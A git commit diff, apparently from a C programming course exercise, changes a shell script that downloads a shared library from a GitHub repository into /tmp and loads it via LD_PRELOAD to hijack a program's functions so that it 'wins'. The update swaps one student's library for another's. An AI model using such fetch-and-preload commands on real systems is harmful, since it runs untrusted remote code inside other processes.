fc9aca3a9bf0ffc7a712337943d4b1b9238e28e3
Cletus Samuel <109830247+CletsyMedia@users.noreply.github.com>
2023-10-17 03:19:57 +0100

    Update 101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/CletsyMedia/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libhack.so
-export LD_PRELOAD=/tmp/libhack.so
+wget -P /tmp https://github.com/Tolulope05/alx-low_level_programming/raw/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
